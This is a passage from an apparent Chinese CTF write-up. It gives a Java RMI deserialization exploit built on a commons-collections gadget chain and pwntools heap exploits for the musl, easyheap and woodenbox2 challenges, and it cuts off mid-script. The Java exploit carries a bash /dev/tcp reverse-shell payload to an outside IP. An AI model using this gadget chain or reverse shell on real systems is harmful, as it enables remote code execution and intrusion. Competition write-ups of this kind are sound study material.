<p>就能读文件, 但是发现有些不可见字符读出来是问号, 之后查看 lib 文件夹发现 commons-collections-3.1 + rmi 的 hint, 发现有个 MarkDown.class 里面是个 extends Remote 的interface, 函数签名不用反编译就能看出来, 刚好有个参数是 Object 的, 可以利用. 本地造一个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> services;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MarkDown</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">parseDocument</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>就能调用 rmi 了,<br>exp:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmb122.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> services.MarkDown;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span> , <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/111.111.111.111/19132 0&gt;&amp;1&quot;</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;placeholder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;placeholder&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.getRegistry( <span class="string">&quot;121.36.222.22&quot;</span>, <span class="number">2078</span>);</span><br><span class="line">        <span class="type">MarkDown</span> <span class="variable">markDown</span> <span class="operator">=</span> (MarkDown) r.lookup(<span class="string">&quot;markdown&quot;</span>);</span><br><span class="line">        markDown.parseDocument(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h3><p>迷你libc，堆块合并时有类似ptmalloc的unlink<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;119.3.158.103&quot;</span>,<span class="number">19008</span>)</span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">aBinsh = <span class="number">0x91345</span></span><br><span class="line">overflow = <span class="string">&quot;L&quot;</span>*<span class="number">0x50</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0xbadbeef</span>)*<span class="number">2</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x81</span>)+<span class="string">&quot;ldddddhm&quot;</span></span><br><span class="line">prdi = <span class="number">0x14862</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, YorN, Content</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>);sla(<span class="string">&quot; &gt;&quot;</span>,<span class="built_in">str</span>(size));sla(<span class="string">&quot; &gt;&quot;</span>,YorN);sa(<span class="string">&quot; &gt;&quot;</span>,Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">Index</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>);sla(<span class="string">&quot; &gt;&quot;</span>,<span class="built_in">str</span>(Index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">Index, Content</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>);sla(<span class="string">&quot; &gt;&quot;</span>,<span class="built_in">str</span>(Index));se(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">examine</span>(<span class="params">Index</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>);sla(<span class="string">&quot; &gt;&quot;</span>,<span class="built_in">str</span>(Index))</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">&quot;e\n&quot;</span>)</span><br><span class="line">[add(<span class="number">0x60</span>,<span class="string">&quot;N&quot;</span>,<span class="string">&quot;LuDuiNiuBi\n&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">[delete(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>]]</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&quot;Y&quot;</span>,overflow)</span><br><span class="line">libc_base = u64(examine(<span class="number">4</span>)[<span class="number">8</span>:<span class="number">14</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x292e38</span></span><br><span class="line">transform(<span class="number">1</span>,p64(<span class="number">1</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+<span class="number">0x290000</span>)+p64(libc_base+<span class="number">0x290008</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">transform(<span class="number">1</span>,p64(libc_base+<span class="number">0x290010</span>)+p64(<span class="number">0x4</span>)+p64(<span class="number">0x602034</span>)+p64(<span class="number">8</span>)+p64(libc_base+<span class="number">0x294fd8</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">transform(<span class="number">1</span>,p32(<span class="number">0</span>))</span><br><span class="line">retInStack = u64(examine(<span class="number">2</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">transform(<span class="number">0</span>,p64(<span class="number">0x70</span>)+p64(retInStack)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">transform(<span class="number">1</span>,p64(libc_base+prdi)+p64(libc_base+aBinsh)+p64(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>])+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure></p>
<h3 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h3><p>add函数中即使size不对也会先分配一个Item对象再返回进行分配,也就是可以使fastbin的fd指针落到原来的chunk指针的位置前，就可以利用edit任意写.</p>
<p>先劫持free@got为puts@plt泄露libc，然后劫持为system从而getshell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">len</span>, cont</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;e?\n&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;e?\n&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;ed?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;ed?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendafter(<span class="string">&quot;ge?\n&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;121.36.209.145&quot;</span>, <span class="number">9997</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;e?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;e?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">add(<span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x400</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x400670</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602020</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x6f690</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;e?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;ce:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;e?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0x600</span>))</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(libc + <span class="number">0x45390</span>))</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h3><p>edit功能存在堆溢出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">change_item</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> length; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> nptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    idx = atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( PTR_LIST[<span class="number">2</span> * idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>, &amp;buf);</span><br><span class="line">      read(<span class="number">0</span>, &amp;nptr, <span class="number">8uLL</span>);</span><br><span class="line">      length = atoi(&amp;nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>, &amp;nptr);</span><br><span class="line">      v3 = read(<span class="number">0</span>, PTR_LIST[<span class="number">2</span> * idx], length);  <span class="comment">// overflow</span></span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)PTR_LIST[<span class="number">2</span> * idx] + v3 - <span class="number">1</span>) == <span class="number">10</span> )</span><br><span class="line">        *((_BYTE *)PTR_LIST[<span class="number">2</span> * idx] + v3 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)&amp;itemlist + <span class="number">4</span> * idx) = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)PTR_LIST[<span class="number">2</span> * idx]);<span class="comment">// 更新长度</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先利用堆块合并控制中间的堆块，遗留下main_arena地址，修改低字节指向iofile，修改stdout结构体来泄露libc，接着就劫持malloc_hook<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">file = <span class="string">&#x27;./woodenbox2&#x27;</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">libc = e.libc</span><br><span class="line">rlibc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;121.36.215.224&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;9998&#x27;</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">code=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">local</span>):</span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        p = process(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">s, c</span>):</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(s))</span><br><span class="line">    sea(<span class="string">&quot;:&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">i, s, c</span>):</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(s))</span><br><span class="line">    sea(<span class="string">&quot;:&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span 